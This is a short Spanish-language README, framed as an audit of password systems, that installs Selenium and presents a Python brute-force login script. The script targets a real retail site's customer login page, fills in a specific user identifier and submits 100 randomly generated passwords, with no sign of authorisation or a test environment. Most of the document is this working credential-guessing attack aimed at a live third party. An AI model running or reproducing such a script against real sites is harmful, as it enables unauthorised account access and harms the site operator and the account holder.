# Automatización de credenciales con python y selenium
Auditar la implementación de los sistemas de creación, actualización, acceso, transmisión y recuperación de contraseñas

## Selenium 
Selenium es un entorno de pruebas que se utiliza para automatizar servicios de sowftware.

## Instalación
Usa el pip en la consola para instalar el paquete de selenium.

```bash
pip install selenium
```
## Ejemplo de uso de python con selenium (ataque fuerza bruta)

```python
import string
import time
import random

#Carga el módulo webdriver para implementar las clases y métodos para el soporte de los diferentes navegadores
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
driver = webdriver.Chrome()
driver.get('https://www.wei.cl/cliente/ingreso')
time.sleep(5)
letters = string.ascii_letters + string.digits
for x in range(100):
    usr = driver.find_element_by_id("client-username")
    usr.clear()
    usr.send_keys("20189579-0")
    psw = driver.find_element_by_id("client-password")
    str = ''.join(random.choice(letters) for i in range(random.randrange(6,10)))
    
    #Se introduce el valor que contiene la variable password
    psw.send_keys(str)
    print(str)
    
    #Está variable permite efectuar un evento click a la página web mediante el xpath
    clk = driver.find_element_by_xpath('//*[@id="form-ingreso-window"]/button').submit()
    time.sleep(1)
    psw.clear()
```
